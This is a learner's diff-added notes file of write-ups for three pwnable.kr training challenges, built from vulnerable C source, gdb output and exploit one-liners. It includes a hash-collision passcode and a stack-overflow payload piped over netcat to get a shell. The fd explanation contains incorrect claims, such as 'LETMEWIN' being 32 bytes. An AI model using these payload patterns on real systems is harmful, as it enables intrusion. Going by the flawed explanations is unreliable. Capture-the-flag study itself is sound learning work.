@@ -1,0 +1,272 @@
+Lessons learned for pwnable challanges
+
+fd
+
+
+C code:
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+        if(argc<2){
+                printf("pass argv[1] a number\n");
+                return 0;
+        }
+        int fd = atoi( argv[1] ) - 0x1234;
+        int len = 0;
+        len = read(fd, buf, 32);
+        if(!strcmp("LETMEWIN\n", buf)){
+                printf("good job :)\n");
+                system("/bin/cat flag");
+                exit(0);
+        }
+        printf("learn about Linux file IO\n");
+        return 0;
+
+}
+
+
+
+So we have to run it with a number as argv[1]. 0x1234 (6440) will be subtracted
+from it and assigned to fd. fd is a file descriptor which can either take a
+system file as input, or it can take 0,1,2 (std input, std output, std error)
+An open Char variable was created above to hold 32 bytes, and C's read function
+(which returns a number) assigns that value to buf (and only grabs the first
+32 bytes of buf, anything else gets truncated.
+
+*CRUX: If we can get fd to be 0,1 or 2, then std input/ output/error will be 
+assigned to buf
+
+buf is strng compared to "LETMEWIN" and if they match, the file "flag" is cat'd
+to the ouput
+
+KEY OBSERVATION: LETMEWIN is 32 bytes (4 bytes per char, 8 chars). If we were
+to type into our terminal on any regular day "LETMEWIN" it returns:
+"LETMEWIN: command not found"
+Which is our std error and consequently is posted to std output. 
+so ALL fd values, 0,1,2 get truncated after 32 bytes to give the same 'LETMEWIN'
+
+
+
+
+
+
+collisions
+
+the C code:
+
+#include <stdio.h>
+#include <string.h>
+unsigned long hashcode = 0x21DD09EC;
+unsigned long check_password(const char* p){
+        int* ip = (int*)p;
+        int i;
+        int res=0;
+        for(i=0; i<5; i++){
+                res += ip[i];
+        }
+        return res;
+}
+
+int main(int argc, char* argv[]){
+        if(argc<2){
+                printf("usage : %s [passcode]\n", argv[0]);
+                return 0;
+        }
+        if(strlen(argv[1]) != 20){
+                printf("passcode length should be 20 bytes\n");
+                return 0;
+        }
+
+        if(hashcode == check_password( argv[1] )){
+                system("/bin/cat flag");
+                return 0;
+        }
+        else
+                printf("wrong passcode.\n");
+        return 0;
+}
+
+So we have to call the program with an argv[1] that is 20 bytes (20 char) long.
+When this happens it does its own hashing of it in "check password"
+Check password takes a char pointer p as an argument. This pointer is turned
+into an integer. Each integer takes up 4 bytes (assuming ascii / unicode 8).
+This integer string is parsed into 5 chunks of these 4 bytes (20 total)
+and each of those are added together. If their sum equals the hashcode value
+(0x21dd09ec) then the flag is given to us.
+
+we can pass hexcode to python, if we take to total and subtract 4* some random
+hex amount, we can add the difference plus that '4* amount' to get 20 total
+bytes whose sum is the requested hexcode. I chose to subtract
+0x21dd09ec - 4*0x02020202 = 0x19d501e4
+
+So we can simply pass this on in an inline python command
+
+(use backticks to surround a variable and make that variable a python printed
+statement. To call python inline we type `python -c <command>`)
+
+./col "`python -c "print ('\xe4\x01\xd5\x19'+4*'\x02\x02\x02\x02')"`"
+
+(NOTE: because of little endian rules, we pass the hex code backwards in 2 byte
+chunks)
+
+
+
+
+
+
+
+
+::::::::add a file to another server (one that you would normally ssh into)::::
+
+scp FileToBeMoved.txt -P2222 name@server.org
+
+
+It appears that ownership of the file belongs to the new user at the server
+(which is good, it hides the origin I suspect) 
+NOTE: use a capital 'P' instead of lowercase
+
+
+
+
+bof
+
+So I guess the theory for a buffer overflow is add enough input that it
+spills over into the actual program itself. You have to look at assembly code
+to really get it. Use gdb to debug at specific instances
+so for the program here's the C code:
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+
+
+So the func calls '0xdeadbeef', func is then checked if its value is 
+'0xcafebabe', which is impossible, since we don't have any, so this is achieved
+by buffer overflow
+
+opening it with gdp, breaking at the process where we compare strings, putting 
+some input, then checking what it gets should demonstrate how large the buffer
+is then at what point any extra info we put in would go over and change to read
+'0xcafebabe'
+
+'gdp bof' opens the debugger
+
+'disassemble func' gives the assemler code for func:
+
+Dump of assembler code for function func:
+   0x5655562c <+0>:	push   %ebp
+   0x5655562d <+1>:	mov    %esp,%ebp
+   0x5655562f <+3>:	sub    $0x48,%esp
+   0x56555632 <+6>:	mov    %gs:0x14,%eax
+   0x56555638 <+12>:	mov    %eax,-0xc(%ebp)
+   0x5655563b <+15>:	xor    %eax,%eax
+   0x5655563d <+17>:	movl   $0x78c,(%esp)
+   0x56555644 <+24>:	call   0x56555645 <func+25>
+   0x56555649 <+29>:	lea    -0x2c(%ebp),%eax
+   0x5655564c <+32>:	mov    %eax,(%esp)
+   0x5655564f <+35>:	call   0x56555650 <func+36>
+   0x56555654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
+   0x5655565b <+47>:	jne    0x5655566b <func+63>
+   0x5655565d <+49>:	movl   $0x79b,(%esp)
+   0x56555664 <+56>:	call   0x56555665 <func+57>
+   0x56555669 <+61>:	jmp    0x56555677 <func+75>
+   0x5655566b <+63>:	movl   $0x7a3,(%esp)
+   0x56555672 <+70>:	call   0x56555673 <func+71>
+   0x56555677 <+75>:	mov    -0xc(%ebp),%eax
+   0x5655567a <+78>:	xor    %gs:0x14,%eax
+   0x56555681 <+85>:	je     0x56555688 <func+92>
+   0x56555683 <+87>:	call   0x56555684 <func+88>
+   0x56555688 <+92>:	leave  
+   0x56555689 <+93>:	ret    
+End of assembler dump.
+
+
+looking at the like that compares the input to '0xcafebabe'
+  
+   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
+
+we can see that '0xcafebabe' is compared to ebp + hex 8
+We can set a breakpoint on that process to pause and see the output
+
+	'break *0x56555654'
+(Note if we call 'disassemble func' on it again we will see a '=>' on the left)
+
+can call 'info registers' to see info
+
+eax            0xffffdc0c	-9204
+ecx            0xf7fc55a0	-134457952
+edx            0xf7fc687c	-134453124
+ebx            0x0	0
+esp            0xffffdbf0	0xffffdbf0
+ebp            0xffffdc38	0xffffdc38
+esi            0xf7fc5000	-134459392
+edi            0xf7fc5000	-134459392
+eip            0x56555654	0x56555654 <func+40>
+eflags         0x246	[ PF ZF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+
+call 'x/wx $edbp+0x8' to see what this value is (x/wx = examine word(hex format)
+	0xffffdc40:	0xdeadbeef
+(this makes sense, we hacen't changed anything)
+run it to see what happens as the tracker stops
+	'r'   (confirm type 'y' do start from beginning)
+
+	type in a long string with easily identifiable characters to check value
+
+Starting program: /tmp/mikaylasmells/bof 
+overflow me : 
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ
+
+Breakpoint 1, 0x56555654 in func ()
+		'x/wx $ebp+0x8' shows
+	0xffffdc40:	0x4e4e4e4e
+python confirms this is 'NNNN' so the buffer accepts info up to 52 chracters
+then the next bit of string is read.... well we want that value to be 
+'0xcafebabe', so let's do that, 
+(NOTE, I tried typing 'AAAAB.....MMMM\xbe\xba\xfe\xca' but it didn't work.
+Netcatting it in works though), exit and perform:
+
+	(echo `python -c "print(52*'a'+'\xbe\xba\xfe\xca\n')"`; cat) | nc pwnable.kr 9000
+
+NOTE: NEED the newline character \n, otherwise it doesn't work. Also it should
+work with: 
+	(echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM\xbe\xba\xfe\xca"; cat) | ./bof
+
+But that's not going through.... something to figure out. anyway, a 'whoami'
+command shows we are 'bof' so... yeah
+
+
+
+gdp printing
+
+If you ever want to see what a register is currently holding, if you know it's
+a string, either of these two work:
+	'x/s $rdx'
+	'printf "%s", rdx'
+(To see what registers are actually available, remember 'info registers')
+
+
